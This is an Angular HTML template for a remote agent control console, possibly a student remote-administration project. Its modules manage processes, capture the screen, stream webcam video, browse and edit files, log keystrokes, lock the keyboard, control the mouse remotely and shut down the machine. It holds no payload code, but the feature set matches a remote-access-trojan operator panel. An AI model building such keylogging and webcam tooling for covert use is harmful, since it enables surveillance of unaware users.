<div class="agent-console">

  <!-- ================= HEADER ================= -->
  <header class="agent-header">
    <div class="agent-id">
      <h1>{{ agent?.machineId }}</h1>
      <p>Remote Agent Control Console</p>
    </div>
<div class="agent-controls">

  <div class="status-chip online">
    ‚óè ONLINE
  </div>

  <div class="status-chip ws">
    WS: {{ ws.status() }}
  </div>

  <button
    class="btn-connect"
    (click)="connectWS()"
    [disabled]="!agent?.online || ws.status() === 'connected'">
    üîå CONNECT
  </button>

</div>

  </header>

  <!-- ================= BODY ================= -->
  <div class="agent-body">

    <!-- ===== SIDEBAR MODULES ===== -->
    <aside class="module-sidebar">
      <div
        class="module-item"
        *ngFor="let m of modules"
        [class.active]="selectedModule() === m.key"
        (click)="openModule(m.key)">
        <span class="icon">{{ m.icon }}</span>
        <span>{{ m.label }}</span>
      </div>
    </aside>

    <!-- ===== MAIN WORKSPACE ===== -->
    <main class="module-workspace">

      <!-- EMPTY -->
      <div *ngIf="!selectedModule()" class="module-empty">
        <h2>Select a module</h2>
        <p>Choose a module from the left panel to start controlling this agent.</p>
      </div>

      <!-- MODULE HEADER -->
      <div *ngIf="selectedModule()" class="module-header">
        <h2>{{ selectedModule() }}</h2>
        <button class="btn back" (click)="backToModules()">‚Üê Back</button>
      </div>

      <!-- MODULE CONTENT -->
      <div class="module-content">
         <!-- ========== PROCESS MANAGER ========== -->
<div *ngIf="selectedModule() === 'PROCESSES'" class="section-card process">


  <!-- HEADER -->
  <div class="module-top">
    <h3>üîß Process Manager</h3>
    <!-- <button class="btn-back" (click)="backToModules()">‚Üê Modules</button> -->
  </div>

  <!-- COMMAND PANEL -->
  <div class="command-panel">

    <div class="command">
      <button class="cmd-btn" (click)="sendProcessList()">üìã LIST</button>
      <span class="cmd-hint">Load all running processes</span>
    </div>

    <div class="command danger">
      <input type="number" placeholder="PID‚Ä¶" [(ngModel)]="killPid">
      <button class="cmd-btn danger" (click)="killProcess(killPid)">üóë KILL</button>
    </div>

    <div class="command">
      <input type="text" placeholder="process.exe" [(ngModel)]="startExeName">
      <button class="cmd-btn" (click)="startProcess()">‚ûï START</button>
    </div>

  </div>

  <!-- DATA PANEL -->
  <div class="data-panel">
    <table *ngIf="processList().length">
      <thead>
        <tr>
          <th>PID</th>
          <th>Process</th>
          <th>Threads</th>
          <th></th>
        </tr>
      </thead>
      <tbody>
        <tr *ngFor="let p of processList()">
          <td>{{ p.pid }}</td>
          <td>{{ p.exe || p.name }}</td>
          <td>{{ p.count || p.threads }}</td>
          <td>
            <button class="table-kill" (click)="killProcess(p.pid)">KILL</button>
          </td>
        </tr>
      </tbody>
    </table>

    <div *ngIf="!processList().length" class="placeholder">
      No data loaded. Click <b>LIST</b> to fetch processes.
    </div>
  </div>

</div>
<!-- ========== APP MANAGER ========== -->
<div *ngIf="selectedModule() === 'APPLICATIONS'" class="section-card app">



  <div class="module-top">
    <h3>üìÅ Application Manager</h3>
    <!-- <button class="btn-back" (click)="backToModules()">‚Üê Modules</button> -->
  </div>

  <!-- COMMAND PANEL -->
  <div class="command-panel">

    <div class="command">
      <button class="cmd-btn" (click)="sendAppList()">üìã LIST</button>
      <span class="cmd-hint">Load running applications</span>
    </div>

    <div class="command danger">
      <input type="text" placeholder="app.exe" [(ngModel)]="killExeName">
      <button class="cmd-btn danger" (click)="killApp(killExeName)">üóë KILL</button>
    </div>

    <div class="command">
      <input type="text" placeholder="app.exe" [(ngModel)]="startExeName">
      <button class="cmd-btn" (click)="sendAppStart()">‚ûï START</button>
    </div>

  </div>

  <!-- DATA PANEL -->
  <div class="data-panel">
    <table *ngIf="appList().length">
      <thead>
        <tr>
          <th>Executable</th>
          <th>Process Count</th>
          <th></th>
        </tr>
      </thead>
      <tbody>
        <tr *ngFor="let app of appList()">
          <td>{{ app.exe }}</td>
          <td>{{ app.count }}</td>
          <td>
            <button class="table-kill" (click)="killAppAll(app.exe)">KILL ALL</button>
          </td>
        </tr>
      </tbody>
    </table>

    <div *ngIf="!appList().length" class="placeholder">
      Click <b>LIST</b> to load applications.
    </div>
  </div>

</div>
<!-- ========== SCREEN MODULE ========== -->
<div *ngIf="selectedModule() === 'SCREEN'" class="section-card screen-module">

  <div class="module-header">
    <h3>üñº SCREEN CAPTURE</h3>
    <div class="module-actions">
      <button class="cmd-btn" (click)="sendScreenCaptureBinary()">üì∑ CAPTURE</button>
      <button class="cmd-btn ghost" (click)="clearScreenshot()">CLEAR</button>
    </div>
  </div>

  <div class="screen-stage">
    <ng-container *ngIf="screenshot() as shot; else noScreen">
      <img [src]="shot" class="screen-image" />
    </ng-container>

    <ng-template #noScreen>
      <div class="empty-state">
        <div class="empty-title">NO SCREENSHOT</div>
        <div class="empty-sub">Click CAPTURE to grab remote screen</div>
      </div>
    </ng-template>
  </div>

</div>

<!-- ========== WEBCAM MODULE ========== -->
<div *ngIf="selectedModule() === 'WEBCAM'" class="section-card webcam-module">

  <div class="module-header">
    <h3>üì∑ WEBCAM STREAM</h3>
    <div class="module-actions">
      <button class="cmd-btn" (click)="sendWebcamStartStream()">‚ñ∂ START</button>
      <button class="cmd-btn danger" (click)="sendWebcamStopStream()">‚èπ STOP & SAVE</button>
    </div>
  </div>

  <div class="webcam-stage">
    <img
      *ngIf="ws.webcamFrameUrl() as frame"
      [src]="frame"
      class="webcam-image"
    />

    <div *ngIf="!ws.webcamFrameUrl()" class="empty-state">
      <div class="empty-title">WEBCAM OFFLINE</div>
      <div class="empty-sub">Start stream to view camera</div>
    </div>
  </div>

  <canvas #webcamCanvas hidden></canvas>
</div>
<!-- ========== EXPLORER MODULE ========== -->
<div *ngIf="selectedModule() === 'EXPLORER'" class="section-card explorer-module">

  <!-- HEADER -->
  <div class="explorer-header">
    <div class="explorer-title">
      üìÅ FILE EXPLORER
    </div>

    <div class="explorer-actions">
      <button class="exp-btn" (click)="explorerGoRoot()">üíΩ ROOT</button>
      <button class="exp-btn" (click)="explorerRefresh()">üîÑ REFRESH</button>
      <button class="exp-btn ghost" (click)="explorerBack()">‚¨Ö</button>
    </div>
  </div>

  <!-- PATH BAR -->
  <div class="explorer-path">
    <span>PATH</span>
    <code>{{ currentExplorerPath() || 'ROOT' }}</code>
  </div>

  <!-- GRID -->
  <div class="explorer-grid" *ngIf="explorerItems().length">
    <div
      class="explorer-item"
      *ngFor="let item of explorerItems()"
      (dblclick)="onExplorerItemDblClick(item)"
    >
      <div class="item-icon">
        {{ getExplorerIcon(item) }}
      </div>

      <div class="item-name" title="{{ item.name }}">
        {{ item.name }}
      </div>
    </div>
  </div>

  <!-- EMPTY -->
  <div *ngIf="!explorerItems().length" class="explorer-empty">
    <div class="empty-icon">üìÇ</div>
    <div class="empty-text">
      Click <b>ROOT</b> to load file system
    </div>
  </div>

</div>

<!-- ================= FILE EDITOR MODAL ================= -->
<div class="editor-backdrop" *ngIf="editorOpen()" (click)="closeEditor()"></div>

<div class="editor-modal" *ngIf="editorOpen()">

  <div class="editor-header">
    <div class="editor-title">
      ‚úèÔ∏è Editing: {{ editorPath() }}
    </div>

    <div class="editor-buttons">
      <button class="editor-save" (click)="saveEditorFile()">üíæ Save</button>
      <button class="editor-close" (click)="closeEditor()">‚úñ Close</button>
    </div>
  </div>

  <textarea
    class="editor-textarea"
    [value]="editorContent()"
    (input)="updateEditorText($event)"
    spellcheck="false"
  ></textarea>

</div>

<!-- ========== KEYLOGGER MODULE ========== -->
<div *ngIf="selectedModule() === 'KEYLOGGER'" class="section-card keylogger-module">

  <!-- HEADER -->
  <div class="module-header">
    <h3>‚å® KEYLOGGER</h3>

    <div class="module-actions">
      <button class="cmd-btn green"
              [class.active]="keyloggerRunning()"
              (click)="sendKeyloggerStart()">
        ‚ñ∂ START
      </button>

      <button class="cmd-btn red"
              [class.active]="!keyloggerRunning()"
              (click)="sendKeyloggerStop()">
        ‚ñ† STOP
      </button>

      <button class="cmd-btn"
              [class.active]="keyloggerLocked()"
              (click)="sendKeyloggerLock()">
        üîí LOCK
      </button>

      <button class="cmd-btn"
              [class.active]="!keyloggerLocked()"
              (click)="sendKeyloggerUnlock()">
        üîì UNLOCK
      </button>

      <button class="cmd-btn ghost" (click)="clearKeylogs()">üßπ CLEAR</button>
    </div>
  </div>

  <!-- STATUS BAR -->
  <div class="keylogger-status">
    <span>
      RECORDING:
      <b [class.on]="keyloggerRunning()" [class.off]="!keyloggerRunning()">
        {{ keyloggerRunning() ? 'ON' : 'OFF' }}
      </b>
    </span>

    <span>
      KEYBOARD:
      <b [class.lock]="keyloggerLocked()" [class.unlock]="!keyloggerLocked()">
        {{ keyloggerLocked() ? 'LOCKED' : 'UNLOCKED' }}
      </b>
    </span>

    <span>LOGS: {{ ws.keylogList().length }}</span>
  </div>

  <!-- LOG OUTPUT -->
  <div class="keylog-panel">
    <pre *ngIf="ws.keylogList().length; else noLog" class="keylog-text">
{{ keylogText }}
    </pre>

    <ng-template #noLog>
      <div class="empty-state">
        <div class="empty-title">NO KEYSTROKES</div>
        <div class="empty-sub">Press START to capture input</div>
      </div>
    </ng-template>
  </div>

</div>
<!-- ========== GALLERY MODULE ========== -->
<div *ngIf="selectedModule() === 'GALLERY'" class="section-card gallery-module">

  <!-- HEADER -->
  <div class="module-header">
    <h3>üéû MEDIA GALLERY</h3>

    <div class="module-actions">
      <button class="cmd-btn" (click)="reloadGallery()">üîÑ RELOAD</button>
      
    </div>
  </div>

  <div class="gallery-layout">

    <!-- LEFT: MEDIA LIST -->
    <div class="gallery-list">

      <div *ngIf="!ws.galleryItems().length" class="empty-state">
        <div class="empty-title">NO MEDIA</div>
        <div class="empty-sub">Stream & save video or screenshots first</div>
      </div>

      <div
        class="media-item"
        *ngFor="let g of ws.galleryItems()"
        (click)="openGalleryItem(g)"
        [class.active]="ws.viewingFile()?.name === g.name"
      >
        <div class="media-icon">
          {{ isVideo(g.name) ? 'üé¨' : 'üñºÔ∏è' }}
        </div>

        <div class="media-info">
          <div class="media-name">{{ g.name }}</div>
          <div class="media-size">
            {{ g.size ? (g.size / 1024 | number:'1.1-1') + ' KB' : '' }}
          </div>
        </div>
      </div>
    </div>

    <!-- RIGHT: PREVIEW -->
    <div class="gallery-preview">

      <ng-container *ngIf="ws.viewingFile() as file; else noPreview">

        <div class="preview-header">
          <span>‚ñ∂ PREVIEW</span>
          <span class="preview-name">{{ file.name }}</span>
        </div>

        <!-- VIDEO -->
        <video
          *ngIf="isVideo(file.name)"
          [src]="ws.mediaUrl()"
          controls
          autoplay
          class="preview-media"
        ></video>

        <!-- IMAGE -->
        <img
          *ngIf="isImage(file.name)"
          [src]="ws.mediaUrl()"
          class="preview-media"
        />

      </ng-container>

      <ng-template #noPreview>
        <div class="empty-preview">
          <div class="empty-title">NO SELECTION</div>
          <div class="empty-sub">Click a media file to preview</div>
        </div>
      </ng-template>

    </div>

  </div>
</div>
<!-- ========== REMOTE CONTROL ========== -->
<div *ngIf="selectedModule() === 'REMOTE'" class="section-card remote-module">

  <!-- HEADER -->
  <div class="remote-header">
    <div class="remote-title">
      üéÆ REMOTE CONTROL
      <span class="remote-status"
            [class.active]="remoteActive()">
        {{ remoteActive() ? 'LIVE' : 'OFFLINE' }}
      </span>
    </div>

    <div class="remote-actions">
      <button class="remote-btn"
              [class.danger]="remoteActive()"
              (click)="toggleRemote()">
        {{ remoteActive() ? '‚èπ STOP' : '‚ñ∂ START' }}
      </button>
    </div>
  </div>

  <!-- SCREEN AREA -->
  <div class="remote-screen-wrapper">

    <ng-container *ngIf="screenshot() as shot; else noRemoteShot">
      <div class="remote-screen-frame">
        <img
          [src]="shot"
          alt="Remote Screen"
          (mousemove)="onRemoteMouseMove($event)"
          (mousedown)="onRemoteMouseDown($event)"
          (mouseup)="onRemoteMouseUp($event)"
          (wheel)="onRemoteWheel($event)"
          (contextmenu)="onRemoteContextMenu($event)"
        />

        <!-- OVERLAY -->
        <div class="remote-overlay">
          LIVE STREAM
        </div>
      </div>
    </ng-container>

    <ng-template #noRemoteShot>
      <div class="remote-placeholder">
        <div class="icon">üñ•</div>
        <div class="text">Remote screen is not active</div>
        <div class="sub">Click START to begin streaming</div>
      </div>
    </ng-template>

  </div>
</div>
<!-- ========== SYSTEM CONTROL ========== -->
<div *ngIf="selectedModule() === 'SYSTEM'" class="section-card system-module">

  <!-- HEADER -->
  <div class="system-header">
    <div class="system-title">
      üíª SYSTEM CONTROL
      <span class="system-badge">DANGER ZONE</span>
    </div>

    <div class="system-subtitle">
      Critical actions affecting the remote machine
    </div>
  </div>

  <!-- WARNING BOX -->
  <div class="system-warning">
    ‚ö† These actions will immediately affect the remote system.<br>
    Make sure you know what you are doing.
  </div>

  <!-- ACTIONS -->
  <div class="system-actions">

    <!-- SHUTDOWN -->
    <div class="system-card danger">
      <div class="card-icon">‚èª</div>
      <div class="card-content">
        <div class="card-title">Shutdown</div>
        <div class="card-desc">
          Power off the remote machine immediately
        </div>
      </div>
      <button class="system-btn danger"
              (click)="sendSystemShutdown()">
        EXECUTE
      </button>
    </div>

    <!-- RESTART -->
    <div class="system-card warning">
      <div class="card-icon">üîÑ</div>
      <div class="card-content">
        <div class="card-title">Restart</div>
        <div class="card-desc">
          Reboot the remote machine
        </div>
      </div>
      <button class="system-btn warning"
              (click)="sendSystemRestart()">
        EXECUTE
      </button>
    </div>

  </div>

</div>


        <!-- T·∫•t c·∫£ m·∫•y kh·ªëi PROCESS / APP / KEYLOGGER / SCREEN
             b·∫°n gi·ªØ NGUY√äN logic c≈©, ch·ªâ render trong ƒë√¢y -->
      </div>

    </main>

  </div>
</div>
